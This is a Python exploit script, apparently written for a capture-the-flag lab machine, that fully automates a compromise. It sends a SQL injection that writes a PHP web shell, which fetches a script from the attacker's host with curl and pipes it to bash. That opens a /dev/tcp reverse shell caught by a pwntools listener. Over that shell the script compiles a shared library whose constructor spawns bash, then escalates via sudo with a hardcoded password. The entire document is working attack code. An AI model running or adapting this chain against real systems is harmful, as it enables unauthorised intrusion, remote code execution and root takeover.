#!/usr/bin/python3
import requests
import signal
import sys
import subprocess
import os
import atexit
import time
import multiprocessing
from pwn import log, listen
import contextlib

MyIP="10.10.14.13"

main_url= "http://10.10.11.229/shop/index.php?page=product&id=3"

sqli = f"%0A%27%3B%20select%20%27%3C%3Fphp%20system%28%22curl%20http%3A%2F%2F{MyIP}%2Frevshell.sh%7Cbash%22%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Frev.php%27--%20-3"

main_url2= "http://10.10.11.229/shop/index.php?page=/var/lib/mysql/rev"

http_server = subprocess.Popen(["python3","-m","http.server","80"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

lport = "443"

def cleanup():
	if http_server.poll() is None:
		http_server.kill()

atexit.register(cleanup)

def makeRequest():
	contenido_so = '''#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));
	\nvoid inject(){\n\tsystem(\"/bin/bash\");\n}'''

	with open('libcounter.c','w') as archivo:
		archivo.write(contenido_so)

	contenido_revshell= f'''#!/bin/bash\n\nbash -i >& /dev/tcp/{MyIP}/443 0>&1'''


	with open('revshell.sh','w') as archivo:
		archivo.write(contenido_revshell)

	r = requests.get(main_url+sqli)
	time.sleep(1)
	r = requests.get(main_url2)

def main():
	p1 = log.progress("Servicios")
	p1.status("Iniciando servicio HTTP sobre el puerto 80")

	if http_server.poll() is None:
		p1.success("Servicio iniciado con exito")
	else:
		p1.error("El Servicio a tenido problemas al ejecutarse")
		cleanup()
		sys.exit(1)

	try:
		proc = multiprocessing.Process(target=makeRequest)
		proc.start()
	except Exception as e:
		log.error(str(e))
		cleanup(1)
		sys.exit(1)


	with listen(lport, timeout=20) as shell:
		if shell.wait_for_connection():
			shell.sendline("cd /home/rektsu/".encode('utf-8'))
			shell.sendline(f"wget http://{MyIP}/libcounter.c &>/dev/null".encode('utf-8'))
			shell.sendline("gcc -shared -fPIC -o libcounter.so libcounter.c && rm libcounter.c".encode('utf-8'))
			shell.sendline("mv libcounter.so .config/".encode('utf-8'))
			shell.sendline("sudo /usr/bin/stock".encode('utf-8'))
			time.sleep(1)
			shell.sendline("St0ckM4nager".encode('utf-8'))
			time.sleep(1)
			shell.interactive()

if __name__ == '__main__':
    main()

    os.remove("revshell.sh")
    os.remove("libcounter.c")
